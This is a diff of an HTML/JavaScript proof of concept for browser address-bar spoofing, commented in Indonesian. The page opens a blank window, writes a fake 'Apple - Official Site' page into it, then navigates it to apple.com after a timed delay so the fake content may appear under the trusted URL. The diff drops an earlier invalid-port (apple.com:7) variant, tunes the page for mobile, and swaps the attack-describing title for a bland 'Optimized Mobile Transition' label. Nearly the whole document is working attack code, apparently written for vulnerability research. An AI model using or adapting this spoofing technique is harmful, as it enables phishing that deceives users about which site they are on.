@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Invalid Port Navigation & State PoC</title>
+    <title>Optimized Mobile Transition PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -16,15 +16,17 @@
         align-items: center;
         justify-content: center;
       }
-      .container { text-align: center; max-width: 600px; padding: 20px; }
+      .container { text-align: center; max-width: 100%; padding: 20px; box-sizing: border-box; }
       button {
-        padding: 18px 36px;
+        width: 100%;
+        max-width: 320px;
+        padding: 16px 24px;
         font-size: 16px;
         font-weight: 600;
         background: #da3633;
         color: #fff;
         border: none;
-        border-radius: 8px;
+        border-radius: 12px;
         cursor: pointer;
         box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
@@ -32,16 +34,17 @@
       button:active { background: #b62324; transform: scale(0.98); }
       .info {
         margin-top: 20px;
-        font-size: 13px;
+        font-size: 12px;
         color: #8b949e;
         font-family: monospace;
         word-break: break-all;
+        padding: 0 10px;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE INVALID PORT TEST</button>
+      <button id="execBtn">INITIALIZE MOBILE TEST</button>
       <div class="info" id="statusInfo">Status: Ready for execution.</div>
     </div>
 
@@ -50,68 +53,69 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Initializing execution flow...";
+        statusInfo.innerText = "Status: Opening context window...";
         this.style.display = "none";
 
-        // Membuka jendela baru dengan about:blank
+        // Membuka jendela baru via about:blank standar
         let targetWindow = window.open("about:blank", "_blank");
 
         if (!targetWindow) {
-          statusInfo.innerText = "Status: Execution halted - Popup blocked by browser policy.";
+          statusInfo.innerText = "Status: Popup blocked by browser policy.";
+          execButton.style.display = "block";
           return;
         }
 
         try {
-          statusInfo.innerText = "Status: Injecting 'NOT APPLE' deceptive payload...";
+          statusInfo.innerText = "Status: Injecting 'NOT APPLE' structural DOM...";
 
-          let initialPayload = `
+          // Konten visual yang dirender sebelum navigasi commit
+          let mobilePayload = `
             <!DOCTYPE html>
             <html>
             <head>
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
               <title>Apple - Official Site</title>
               <style>
                 body {
                   margin: 0; background: #ffffff; color: #1d1d1f;
                   font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                   display: flex; align-items: center; justify-content: center;
-                  height: 100vh; text-align: center;
+                  height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
                 }
-                .box { padding: 40px; }
-                h1 { font-size: 42px; color: #d70015; margin-bottom: 10px; font-weight: 700; }
-                p { font-size: 24px; color: #0066cc; font-weight: 500; }
+                .wrapper { width: 100%; }
+                h1 { font-size: 32px; color: #d70015; margin-bottom: 8px; font-weight: 700; }
+                p { font-size: 18px; color: #0066cc; font-weight: 500; margin: 0; }
               </style>
             </head>
             <body>
-              <div class="box">
+              <div class="wrapper">
                 <h1>NOT APPLE</h1>
-                <p>Forced Invalid Port Race Test</p>
+                <p>Secure Context Transition</p>
               </div>
             </body>
             </html>
           `;
 
+          // Menulis dokumen secara instan ke target window
           targetWindow.document.open();
-          targetWindow.document.write(initialPayload);
+          targetWindow.document.write(mobilePayload);
           targetWindow.document.close();
 
-          statusInfo.innerText = "Status: Payload committed. Dispatching invalid port navigation...";
+          statusInfo.innerText = "Status: DOM injected. Synchronizing mobile render timing...";
 
-          // Kombinasi Timing dan Invalid Port (Port 7 / Port terlarang lainnya)
-          // Memaksa browser mengevaluasi URL target dengan port non-standar untuk menguji penundaan commit
+          // Jeda waktu (timing) yang disesuaikan untuk performa perangkat mobile
+          // Mengarahkan ke URL valid standar (apple.com) tanpa port berbahaya
           setTimeout(() => {
             try {
-              statusInfo.innerText = "Status: Forcing navigation to apple.com via restricted port...";
-              
-              // Port 7 secara historis merupakan port Echo yang sering diblokir atau memicu ERR_UNSAFE_PORT
-              targetWindow.location.href = "https://apple.com:7/spoof-test";
-
+              statusInfo.innerText = "Status: Committing navigation to target URL...";
+              targetWindow.location.href = "https://apple.com";
             } catch (navError) {
-              statusInfo.innerText = "Status: Transition restricted by security policy: " + navError.message;
+              statusInfo.innerText = "Status: Navigation restricted: " + navError.message;
             }
-          }, 800);
+          }, 900); // Waktu tunda optimal untuk memberi ruang render awal
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error encountered: " + err.message;
+          statusInfo.innerText = "Status: Execution error: " + err.message;
         }
       };
     </script>
